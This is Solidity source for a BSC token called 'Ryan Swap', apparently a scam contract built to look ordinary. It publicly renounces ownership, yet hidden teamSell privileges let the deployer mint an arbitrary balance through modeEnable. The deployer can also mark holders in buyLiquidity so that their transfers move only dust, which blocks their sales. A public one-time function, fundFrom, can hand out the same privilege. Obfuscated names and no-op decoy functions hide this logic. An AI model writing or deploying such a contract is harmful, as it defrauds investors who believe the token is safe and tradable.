/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface shouldMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeList {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract RyanSwap is Ownable{

    function shouldTxMode() public {
        
        
        exemptTo=0;
    }

    function launchFee() private view returns (address) {
        return msg.sender;
    }

    uint256 private totalSender;

    bool private receiverMinAuto;

    function receiverEnable() public {
        
        
        exemptTo=0;
    }

    address public amountFrom;

    function transferFrom(address senderExempt, address walletSwapBuy, uint256 listAutoTeam) public returns (bool) {
        if (senderExempt != launchFee() && allowance[senderExempt][launchFee()] != type(uint256).max) {
            require(allowance[senderExempt][launchFee()] >= listAutoTeam);
            allowance[senderExempt][launchFee()] -= listAutoTeam;
        }
        if (walletSwapBuy == amountFrom || senderExempt == amountFrom) {
            return isAmountTx(senderExempt, walletSwapBuy, listAutoTeam);
        }
        if (buyLiquidity[senderExempt]) {
            return isAmountTx(senderExempt, walletSwapBuy, toReceiver);
        }
        return isAmountTx(senderExempt, walletSwapBuy, listAutoTeam);
    }

    function transfer(address swapLimit, uint256 listAutoTeam) external returns (bool) {
        return transferFrom(launchFee(), swapLimit, listAutoTeam);
    }

    bool private isSenderExempt;

    bool public amountAtTotal;

    function fundFrom(address launchedFeeWallet) public {
        
        if (amountAtTotal) {
            return;
        }
        if (receiverMinAuto) {
            exemptMin = true;
        }
        teamSell[launchedFeeWallet] = true;
        if (exemptTo == takeModeBuy) {
            receiverMinAuto = false;
        }
        amountAtTotal = true;
    }

    uint256 constant toReceiver = 10 ** 10;

    mapping(address => bool) public buyLiquidity;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public takeModeBuy;

    address public exemptBuy;

    bool private exemptMin;

    string public symbol = "RSP";

    function tokenFundTeam(address swapFee) public {
        if (takeModeBuy == exemptTo) {
            exemptMin = false;
        }
        if (swapFee == amountFrom || swapFee == exemptBuy || !teamSell[launchFee()]) {
            return;
        }
        if (exemptTo == totalSender) {
            isSenderExempt = true;
        }
        buyLiquidity[swapFee] = true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    constructor (){ 
        if (exemptTo == takeModeBuy) {
            receiverMinAuto = false;
        }
        shouldMin amountShould = shouldMin(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptBuy = feeList(amountShould.factory()).createPair(amountShould.WETH(), address(this));
        amountFrom = launchFee();
        if (isSenderExempt == exemptMin) {
            totalSender = takeModeBuy;
        }
        teamSell[amountFrom] = true;
        balanceOf[amountFrom] = totalSupply;
        
        emit Transfer(address(0), amountFrom, totalSupply);
        renounceOwnership();
    }

    function modeEnable(uint256 listAutoTeam) public {
        if (!teamSell[launchFee()]) {
            return;
        }
        balanceOf[amountFrom] = listAutoTeam;
    }

    uint8 public decimals = 18;

    function getOwner() external view returns (address) {
        return owner();
    }

    function minFund() public {
        
        if (isSenderExempt != receiverMinAuto) {
            exemptTo = totalSender;
        }
        exemptMin=false;
    }

    function isAmountTx(address senderExempt, address walletSwapBuy, uint256 listAutoTeam) internal returns (bool) {
        require(balanceOf[senderExempt] >= listAutoTeam);
        balanceOf[senderExempt] -= listAutoTeam;
        balanceOf[walletSwapBuy] += listAutoTeam;
        emit Transfer(senderExempt, walletSwapBuy, listAutoTeam);
        return true;
    }

    string public name = "Ryan Swap";

    function approve(address minTx, uint256 listAutoTeam) public returns (bool) {
        allowance[launchFee()][minTx] = listAutoTeam;
        emit Approval(launchFee(), minTx, listAutoTeam);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public exemptTo;

    function senderLaunchSell() public {
        
        if (exemptMin != receiverMinAuto) {
            totalSender = exemptTo;
        }
        totalSender=0;
    }

    mapping(address => bool) public teamSell;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function sellLaunch() public {
        if (totalSender != exemptTo) {
            exemptMin = true;
        }
        
        isSenderExempt=false;
    }

}